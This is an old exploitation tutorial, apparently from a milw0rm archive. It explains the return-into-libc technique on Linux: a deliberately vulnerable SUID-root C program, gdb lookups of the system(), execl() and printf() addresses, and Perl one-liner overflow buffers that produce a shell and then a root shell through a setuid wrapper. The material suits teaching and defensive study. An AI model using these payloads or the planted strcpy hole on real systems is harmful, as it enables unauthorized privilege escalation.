@@ -1,0 +1,563 @@
+                     __           __           __                     
+  .-----.--.--.----.|  |.--.--.--|  |.-----.--|  |  .-----.----.-----.
+  |  -__|_   _|  __||  ||  |  |  _  ||  -__|  _  |__|  _  |   _|  _  |
+  |_____|__.__|____||__||_____|_____||_____|_____|__|_____|__| |___  |
+   by shaun2k2 - member of excluded-team                       |_____|
+
+
+                     ######################################
+		     # Exploitation - Returning into libc #
+		     ######################################
+
+				
+
+
+################
+# Introduction #
+################
+
+Generic vulnerabilities in applications such as the infamous "buffer overflow 
+vulnerability" crop up reguarly in many immensely popular software packages 
+thought to be secure by most, and programmers continue to make the same mistakes 
+as a result of lazy or sloppy coding practices.  As programmers wisen up to the 
+common techniques employed by hackers when exploiting buffer overflow 
+vulnerabilities, the likelihood of having the ability to execute arbitrary 
+shellcode on the program stack decreases.  One such example of why is the fact
+that some Operating Systems are beginning to use non-exec stacks by default, 
+which makes executing shellcode on the stack when exploiting a vulnerable 
+application is a significantly more challenging task.  Another possibility is 
+that many IDSs automatically detect simple shellcodes, making injecting 
+shellcode more of a task.
+As with most scenarios, with a problem comes a solution.  With a little 
+knowledge of the libc functions and their operation, one can take an alternate 
+approach to executing arbitrary code as a result of exploitation of a buffer 
+overflow vulnerability or another bug: returning to libc.
+
+
+The intention of this article is not to teach you the in's and out's of buffer 
+overflows, but to explain in a little detail another technique used to execute 
+arbitrary code as opposed to the classic 'NOP sled + shellcode + repeated 
+retaddr' method.  I assume readers are familiar with buffer overflow 
+vulnerabilities and the basics of how to exploit them.  Also a little bit of the 
+theory of memory organisation is desirable, such as how the little-endian bit 
+ordering system works.  To those who are not familiar with buffer overflow bugs, 
+I suggest you read "Smashing the Stack for Fun and Profit".
+
+<http://www.phrack.org/phrack/49/P49-14>
+
+
+#######################
+# Returning into libc #
+#######################
+
+As the name suggests, the entire concept of the technique is that instead of 
+overwriting the EIP register with the predicted or approxamate address of your 
+NOP sled in memory or your shellcode, you overwrite EIP with the address of a 
+function contained within the libc library, with any function arguments 
+following.  An example of such would be to exploit a buffer overflow bug to
+overwrite EIP with the address of system() or execl() included in the libc 
+library to run an interactive shell (/bin/sh for example).  This idea is quite 
+reasonable, and since it does not involve estimating return addresses and 
+building large exploit buffers, this is quite an appealing technique, but it 
+does have it's downsides which I shall explain later.
+
+Let me demonstrate an example of the technique.  Let's say we have the following 
+small example program, vulnprog:
+
+
+--START
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+
+if(argc < 2) {
+printf("Usage: %s <string>\n", argv[0]);
+exit(-1);
+}
+
+char buf[5];
+
+strcpy(buf, argv[1]);
+return(0);
+}
+
+
+gcc vulnprog.c -o vulnprog
+chown root vulnprog
+chmod +s vulnprog
+
+--END
+
+
+Anyone with a tiny bit of knowledge of buffer overflows can see that the 
+preceding program is ridiculously insecure, and allows anybody who exceeds the 
+bounds of `buf' to overwrite data on the stack.  It would usually be quite easy 
+to write an exploit for the above example program, but let's assume that our 
+friendly administrator has just read a computer security book and has enabled a 
+non-executable stack as a security measure.  This requires us to think a little 
+out of the box in order to be able to execute arbitrary code, but we already 
+have our solution; return into a libc function.
+
+How, you may ask, do we actually get the information we need and prepare an 
+'exploit buffer' in order to execute a libc function as a result of a buffer 
+overflow?  Well, all we need is the address of the desired libc function, and 
+the address of any function arguments.  So let's say for example we wanted to 
+exploit the above program (it is SUID root) to execute a shell (we want /bin/sh) 
+using system() - all we'd need is the address of system() and then the address 
+holding the string "/bin/sh" right?  Correct.  "But how do we begin to get this 
+info?".  That is what we're about to find out.
+
+
+--START
+[shaunige@localhost shaunige]$ echo "int main() { system(); }" > test.c
+[shaunige@localhost shaunige]$ cat test.c
+int main() { system(); }
+[shaunige@localhost shaunige]$ gcc test.c -o test
+[shaunige@localhost shaunige]$ gdb -q test
+(gdb) break main
+Breakpoint 1 at 0x8048342
+(gdb) run
+Starting program: /home/shaunige/test
+
+Breakpoint 1, 0x08048342 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0x4005f310 <system>
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+[shaunige@localhost shaunige]$
+--END
+
+
+First, I create a tiny dummy program which calls the libc function 'system()' 
+without any arguments, and compiled it.  Next, I ran gdb ready to debug our 
+dummy program, and I told gdb to report breakpoints before running the dummy 
+program.  By examining the report, we get the location of the libc function 
+system() in memory - and it shall remain there until libc is recompiled.  So, 
+now we have the address of system(), which puts us half way there.  However, we 
+still need to know how we can store the string "/bin/sh" in memory and 
+ultimately reference it whenever needed.  Let's think about this for a moment.  
+Maybe we could use an environmental variable to hold the string?  Yes, infact, 
+an environmental variable would be ideal for this task, so let's create and use 
+an environment variable called $HACK to store our string ("/bin/sh").  But how 
+are we going to know the memory address of our environment variable and 
+ultimately our string?  We can write a simple utility program to grab the memory 
+address of the environmental variable.  Consider the following code:
+
+
+--START
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+
+if(argc < 2) {
+printf("Usage: %s <environ_var>\n", argv[0]);
+exit(-1);
+}
+
+char *addr_ptr;
+
+addr_ptr = getenv(argv[1]);
+
+if(addr_ptr == NULL) {
+printf("Environmental variable %s does not exist!\n", argv[1]);
+exit(-1);
+}
+
+printf("%s is stored at address %p\n", argv[1], addr_ptr);
+return(0);
+}
+--END
+
+
+This program will give us the address of a given environment variable, let's 
+test it out:
+
+
+--START
+[shaunige@localhost shaunige]$ gcc getenv.c -o getenv
+[shaunige@localhost shaunige]$ ./getenv TEST
+Environmental variable TEST does not exist!
+[shaunige@localhost shaunige]$ ./getenv HOME
+HOME is stored at address 0xbffffee2
+[shaunige@localhost shaunige]$
+--END
+
+
+Great, it seems to work.  Now, let's get down to actually creating our variable 
+with the desired string "/bin/sh" and get the address of it.
+
+First I create the environmental variable, and then I run our above program to 
+get the memory location of a desired environment variable:
+
+
+--START
+[shaunige@localhost shaunige]$ export HACK="/bin/sh"
+[shaunige@localhost shaunige]$ echo $HACK
+/bin/sh
+[shaunige@localhost shaunige]$ ./getenv HACK
+HACK is stored at address 0xbffff9d8
+[shaunige@localhost shaunige]$
+--END
+
+
+This is good, we now have all of the information we need to exploit the 
+vulnerable program: the address of 'system()' (0x4005f310) and the address of 
+the environmental variable $HACK holding our string "/bin/sh" (0xbffff9d8).  So, 
+what do we do with this stuff?  Well, like in all instances of exploiting a 
+buffer overflow hole, we craft an exploit buffer, but ours is somewhat different 
+to one you may be used to seeing, with repeated NOPs (known as a 'NOP sled'), 
+shellcode and repeated return addresses.  Ours exploit buffer needs to look 
+something like this:
+
+
+--START
+
+
+-----------------------------------------------------------------------------  
+|     system() addr     |     return address     |     system() argument    |
+-----------------------------------------------------------------------------
+
+--END
+
+
+"But wait, I thought you said we don't need a return address?".  We don't, but 
+libc functions always require a return address to JuMP to after the function has 
+finished it's job, but we don't care if the program segmentation faults after 
+running the shell, so we don't even need a return address.  Instead, we'll just 
+specify 4 bytes of garbage data, "HACK" for example.  So, with this in mind, a 
+representation of our whole buffer needs to look like this:
+
+
+--START
+
+----------------------------------------------------------------------
+|  DATA-TO-OVERFLOW-BUFFER   |   0x4005f310  |  HACK  |  0xbffff9d8  |
+----------------------------------------------------------------------
+
+--END
+
+
+The data represented by 'DATA-TO-OVERFLOW-BUFFER' is just garbage data used to 
+overflow beyond the bounds ("boundaries") of the `buff' variable enough to 
+position the address of libc 'system()' function (0x4005f310) into the EIP 
+register.
+
+It looks now like we have all of the information and theory of concept we need: 
+build a buffer containing the address of a libc function, followed by a return 
+address to JuMP to after executing the function, followed by any function
+arguments for the libc function.  The buffer will need garbage data at the 
+beginning so as to overflow far enough into memory to overwrite the EIP register 
+with the address of system() so that it jumps to it instead of the next 
+instruction in the program (the same technique used when using shellcode: inject 
+an arbitrary memory address into EIP).  Now that we have all of the necessary 
+theory of this technique and the required information for actually implementing 
+it (i.e address of a libc function and memory address of string "/bin/sh" etc), 
+let's exploit this bitch!
+
+
+################
+# EXPLOITATION #
+################
+
+We have the necessary stuff, so let's get on with the ultimate goal: to get a 
+root shell by executing 'system("/bin/sh")' rather than shellcode!  Let's assume 
+that we are exploiting a Linux system with a non-executable stack, so we have no 
+other option than to 'return into libc'.
+
+Remembering back to the diagram representation of our exploit buffer, we should 
+recall that garbage data must precede the buffer so that we are writing into 
+EIP, followed by the memory location of 'system()', then followed by a return 
+address which we do not need, followed by the memory address of "/bin/sh".  
+Let's see if we can exploit vulnprog.c this way.  If you think back, we have 
+already set and exported the environmental variable $HACK, but let's do it again 
+and grab the memory address, just for clarity's sake.
+
+
+--START
+[shaunige@localhost shaunige]$ export HACK="/bin/sh"
+[shaunige@localhost shaunige]$ echo $HACK
+/bin/sh
+[shaunige@localhost shaunige]$ ./getenv HACK
+HACK is stored at address 0xbffff9d8
+[shaunige@localhost shaunige]$
+--END
+
+
+Good, we now have the address of our string.  You should also remember that we 
+created a dummy program which called 'system()' from which we got our address of 
+system() with the help of GDB.  The address was 0x4005f310.  We've got the 
+stuff, let's write that exploit!  We'll do it with Perl from the console, 
+because it gives us more flexibility and more room for testing than writing a 
+larger program in C does.
+
+First, we must reverse the addresses of 'system'() and the environment variable 
+holding "/bin/sh" due to the fact that we are working on a system using the 
+little-endian byte ordering system.  This gives us:
+
+
+'system()' address:
+####################
+
+\x10\xf3\x05\x40
+
+
+$HACK's address:
+#################
+
+\xd8\xf9\xff\xbf
+
+
+And we know that for the return address required by all libc functions just 
+needs to be a 4-byte value.  We'll just use "HACK".  Therefore, our exploit
+buffer looks like this so far:
+
+
+\x10\xf3\x05\x40HACK\xd8\xf9\xff\xbf
+
+But something is missing.  In it's current state, if fed to vulnprog, the 
+address of 'system()' would NOT overwrite into EIP like we want, because we 
+wouldn't have overflowed the 'buf' variable enough to reach the location of the 
+EIP register.  So, as shown on our above diagram of our exploit buffer, we're 
+going to need to prepend garbage data onto the beginning of our exploit buffer 
+to overwrite far enough into the stack region to reach EIP so that we can 
+overwrite that return address.  How can we know how much garbage data we need, 
+as it needs to be spot on?  The only reasonable way is just trial-n-error.  Due 
+to playing with vulnprog a little, I found that we will probably need about 6-9 
+words of garbage data.
+
+
+--START
+
+[shaunige@localhost shaun]$ ./vulnprog `perl -e 'print "BLEH"x6 . 
+"\x10\xf3\x05\x40HACK\xd8\xf9\xff\xbf"'`
+Segmentation fault
+
+[shaunige@localhost shaun]$ ./vulnprog `perl -e 'print "BLEH"x9 . 
+"\x10\xf3\x05\x40HACK\xd8\xf9\xff\xbf"'
+Segmentation fault
+
+[shaunige@localhost shaun]$ ./vulnprog `perl -e 'print "BLEH"x8 . 
+"\x10\xf3\x05\x40HACK\xd8\xf9\xff\xbf"'
+Segmentation fault
+
+[shaunige@localhost shaun]$ ./vulnprog `perl -e 'print "BLEH"x7 .
+"\x10\xf3\x05\x40HACK\xd8\xf9\xff\xbf"'
+sh-2.05b$ whoami
+shaunige
+sh-2.05b$ exit
+exit
+[shaunige@localhost shaun]$
+
+--END
+
+
+The exploit worked, and it needed 7 words of dummy data.  But wait, why don't we 
+have a rootshell?  ``vulnprog'' is SUID root, so what's going on?  'system()' 
+runs the specified path (in our case "/bin/sh") through /bin/sh itself, so the 
+privileges were dropped, thus giving us a shell, but not a rootshell.  
+Therefore, the exploit *did* work, but we're going to have to use a libc 
+function that *doesn't* drop privileges before executing the path specified 
+("/bin/sh" in our scenario).  
+
+
+#####################
+# Using a 'wrapper' #
+#####################
+
+Hmm, what to do?  We're going to have to use one of the exec() functions, as 
+they do not use /bin/sh, thus not dropping privileges.  First, let's make our 
+job a little easier, and create a little program that will run a shell for us 
+(called a wrapper program).  
+
+
+--START
+/* expl_wrapper.c */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+setuid(0);
+setgid(0);
+system("/bin/sh");
+}
+--END
+
+
+We need a plan: instead of using 'system()' to run a shell, we'll overwrite the 
+return address on stack (EIP register) with the address of 'execl()' function in 
+the libc library.  We'll tell 'execl()' to execute our wrapper program 
+(expl_wrpper.c), which raises our privs and executes a shell.  Voila, a root 
+shell.  However, this is not going to be as easy as the last experiment.  For a 
+start, the execl() function needs NULLs as the last function argument, but 
+'strcpy()' in vulnprog.c will think that a NULL (\x00 in hex representation) 
+means the end of the string, thus making the exploit fail.  Instead, we can use 
+'printf()' to write NULLs without NULL's appearing in the exploit buffer.  Our 
+exploit buffer needs to this time look like this:
+
+
+--START
+
+-------------------------------------------------------------------------------
+GARBAGE|printf() addr|execl() addr| %3$n addr|wrapper addr|wrapper addr|addr of 
+here |-------------------------------------------------------------------------
+------
+
+--END
+
+
+You may notice "%3$n addr".  This is a format string for 'printf()', and due to 
+direct parameter access, it will skip over the two "wrapper addr" addresses, and 
+place NULLs at the end of the exploit buffer.  This time, the address of 
+'printf()' is overwritten into EIP, executing 'printf()' first, followed by the 
+execution of our wrapper program.  This will result in a rootshell since 
+vulnprog is SUID root.
+
+'addr of here' needs to be the address of itself, which will be overwritten by 
+NULLs when 'printf()' skips over the first 2 parameters of the 'execl' call.
+
+To get the addresses of 'printf()' and 'execl()' libc library functions, we'll 
+again write a tiny test program, and use GDB to help us out.
+
+
+--START
+/* test.c */
+
+#include <stdio.h>
+
+int main() {
+execl();
+printf(0);
+}
+
+[shaunige@localhost shaunige]$ gcc test.c -o test -g
+[shaunige@localhost shaunige]$ gdb -q ./test
+(gdb) break main
+Breakpoint 1 at 0x804837c: file test.c, line 4.
+(gdb) run
+Starting program: /home/shaunige/test
+
+Breakpoint 1, main () at test.c:4
+4               execl();
+(gdb) p execl
+$1 = {<text variable, no debug info>} 0x400bde80 <execl>
+(gdb) p printf
+$2 = {<text variable, no debug info>} 0x4006e310 <printf>
+(gdb) quit
+The program is running.  Exit anyway? (y or n) y
+[shaunige@localhost shaunige]$
+--END
+
+
+Excellent, just as we wanted, we have now the addresses of libc 'execl()' and 
+'printf()'.  We'll be using 'printf()' to write NULLs (with the format string 
+"%3$n"), so we'll need to write the printf() format string %3$n into memory.  
+Using the format string %3$n to write NULLs works because it uses direct 
+positional parameters (hence the '$' in the format string) - %3 tells it to skip 
+over the first two function arguments of 'execl()' (address of our wrapper 
+program followed by the address of the wrapper program again), and writes NULLs 
+into the location after the second argument of the execl function.  Let's use an 
+environment variable again, due to past success with them.  We'll use also an 
+environment variable to store the path of our wrapper program which invokes a 
+shell, "/home/shaunige/wrapper".
+
+
+--START
+[shaunige@localhost shaunige]$ export NULLSTR="%3\$n"
+[shaunige@localhost shaunige]$ echo $NULLSTR
+%3$n
+[shaunige@localhost shaunige]$ export WRAPPER_PROG="/home/shaunige/wrapper"
+[shaunige@localhost shaunige]$ echo $WRAPPER_PROG
+/home/shaunige/wrapper
+[shaunige@localhost shaunige]$ ./getenv NULLSTR
+NULLSTR is stored at address 0xbfffff5f
+[shaunige@localhost shaunige]$ ./getenv WRAPPER_PROG
+WRAPPER_PROG is stored at address 0xbffff9a9
+[shaunige@localhost shaunige]$
+--END
+
+
+We now have all of the addresses which we need, except the last argument: 'addr 
+of here'.  This needs to be the address of the buffer when it is copied over.  
+It needs to be the memory address of the overflowable 'buf' variable + 48 bytes. 
+ But how will we get the address of 'buf'?  All we need to do is add an extra 
+line of code to vulnprog.c, recompile it, and we will have the address in memory 
+of 'buf':
+
+
+--START
+[shaunige@localhost shaunige]$ cat vulnprog.c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char *argv[]) {
+if(argc < 2) {
+printf("Usage: %s <string>\n", argv[0]);
+exit(-1);
+}
+
+char buf[5];
+
+printf("addr of buf is: %p\n", buf);
+
+strcpy(buf, argv[1]);
+return(0);
+}
+
+[shaunige@localhost shaunige]$ gcc vulnprog.c -o vulnprog
+[shaunige@localhost pcalc-000]$ ../vulnprog `perl -e 'print
+"1234"x13'`
+addr of buf is: 0xbffff780
+Segmentation fault
+[shaunige@localhost pcalc-000]$--END
+--END
+
+
+With a little simple hexadecimal addition, we can determine that 0xbffff780 + 48 
+= 0xbffff7b0.  This is the address which is the final function argument of 
+'execl()', where the NULLs will be located.  We now have all of the information 
+we need, so exploitation will be easy.  Again, I'm going to craft the exploit 
+buffer from the console with perl, let's get going!
+
+
+--START
+
+[shaunige@localhost shaunige]$ ./vulnprog `perl -e 'print "1234"x7 . 
+"\x10\xe3\x06\x40" . "\x80\xde\x0b\x40" . "\x5f\xff\xff\xbf" . "\xa9\xf9\xff\bf" 
+. "\xa9\xf9\xff\xbf" . "\xb0\xf7\xff\xbf"'`
+
+sh-2.05b#
+
+--END
+
+
+Well, well, looks like our little exploit worked!  Depending on your machine's 
+stack, you may need more garbage data (used for spacing) preceding your exploit 
+buffer, but it worked fine for us.
+
+The exploit buffer was fed to 'vulnprog' thus overwriting the return address on 
+stack with the address of the libc 'printf()' function.  'printf()' then wrote 
+NULLs into the correct place, and exited.  Then 'execl()' executed our wrapper 
+program as instructed, which was designed to invoke a shell (/bin/sh) with 
+privileges of 'vulnprog' (root), leaving us with a lovely rootshell.  Voila.
+
+
+
+##############
+# Conclusion #
+##############
+
+I have hopefully given you a quick insight on an alternative to executing 
+arbitrary code during the exploitation of a stack-based overflow vulnerability 
+in a given program.  Non-executable stacks are becoming more and more common in 
+modern Operating Systems, and knowing how to 'return into libc' rather than 
+using shellcode can be a very useful thing to know.  I hope you've enjoyed this 
+article, I appreciate feedback.
+
+<shaun2k2@excluded.org>
+http://www.excluded.org
+
+
+# milw0rm.com [2006-04-08]
